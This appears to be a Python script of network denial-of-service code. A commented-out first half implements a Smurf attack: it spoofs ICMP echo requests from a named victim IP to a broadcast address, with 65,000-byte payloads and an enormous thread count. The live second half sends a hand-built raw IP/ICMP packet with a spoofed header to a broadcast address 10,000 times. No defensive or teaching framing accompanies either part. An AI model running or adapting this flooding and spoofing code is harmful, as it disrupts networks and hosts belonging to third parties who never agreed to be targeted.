# import socket
# import struct
# import threading
# import time
#
# ICMP_ECHO_REQUEST = 8
# PACKETS_COUNTER = 1
# DELAY = 0.01
# THREADS = 1000000000
#
#
# def calculate_checksum(source_string):
#     count_to = (len(source_string) / 2) * 2
#     checksum = 0
#     count = 0
#
#     while count < count_to:
#         this_val = source_string[count + 1] * 256 + source_string[count]
#         checksum = checksum + this_val
#         checksum = checksum & 0xffffffff
#         count = count + 2
#
#     if count_to < len(source_string):
#         checksum = checksum + source_string[len(source_string) - 1]
#         checksum = checksum & 0xffffffff
#
#     checksum = (checksum >> 16) + (checksum & 0xffff)
#     checksum = checksum + (checksum >> 16)
#     answer = ~checksum
#     answer = answer & 0xffff
#     answer = answer >> 8 | (answer << 8 & 0xff00)
#
#     return answer
#
#
# def create_icmp_packet():
#     icmp_header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, 1, 1)
#     data = b'Q' * 65000
#
#     checksum = calculate_checksum(icmp_header + data)
#     icmp_header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, socket.htons(checksum), 1, 1)
#
#     return icmp_header + data
#
#
# def create_ip_header(source_ip, destination_ip):
#     version_ihl = (4 << 4) + 5  # Version 4, IHL (Internet Header Length) 5 dword
#     tos = 0
#     total_length = 20 + 8  # IP header + ICMP packet
#     ip_id = 54321  # ID of this packet
#     fragment_offset = 0
#     ttl = 255  # Time to live
#     protocol = socket.IPPROTO_ICMP
#     checksum = 0
#
#     src_ip = socket.inet_aton(source_ip)
#     dst_ip = socket.inet_aton(destination_ip)
#
#     ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, ip_id, fragment_offset,
#                             ttl, protocol, checksum, src_ip, dst_ip)
#
#     ip_checksum = calculate_checksum(ip_header)
#     ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, ip_id, fragment_offset,
#                             ttl, protocol, socket.htons(ip_checksum), src_ip, dst_ip)
#
#     return ip_header
#
#
# def send_smurf_attack(broadcast_ip, victim_ip):
#     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
#
#     # flag IP_HDRINCL indicated that a custom IP-header should be used instead of the kernel's one
#     sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
#
#     for i in range(PACKETS_COUNTER):
#
#         ip_header = create_ip_header(victim_ip, broadcast_ip)
#         icmp_packet = create_icmp_packet()
#
#         packet = ip_header + icmp_packet
#
#         sock.sendto(packet, (broadcast_ip, 0))
#
#         print(f"Смурф-атака на {victim_ip} через {broadcast_ip}")
#
#         # time.sleep(DELAY)
#
#
# def thread_smurf_attack(broadcast_ip, victim_ip):
#     threads = []
#
#     for i in range(THREADS):
#         t = threading.Thread(target=send_smurf_attack, args=(broadcast_ip, victim_ip))
#         threads.append(t)
#         t.start()
#
#     for t in threads:
#         t.join()
#
# broadcast_ip = "192.168.214.255"
# victim_ip = "192.168.214.154"
#
# thread_smurf_attack(broadcast_ip, victim_ip)

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

# Create the IP header
ip_header = b'\x45\x00\x00\x1c'  # Version, IHL, Type of Service | Total Length
ip_header += b'\xab\xcd\x00\x00'  # Identification | Flags, Fragment Offset
ip_header += b'\x40\x01\x6b\xd8'  # TTL, Protocol | Header Checksum
ip_header += b'\xAC\x14\x0A\x05'  # Source Address
ip_header += b'\x8E\xFA\xB9\xCE'  # Destination Address

# Create the ICMP header
icmp_header = b'\x08\x00\xe5\xca'  # Type of message, Code | Checksum
icmp_header += b'\x12\x34\x00\x01'  # Identifier | Sequence Number

# Create a payload of 1400 bytes
payload = b'\x00' * 1400  # Filling with zeros

# Combine headers and payload
packet = ip_header + icmp_header + payload

# Send the packet 10,000 times
for i in range(10000):
    s.sendto(packet, ('192.168.214.255', 0))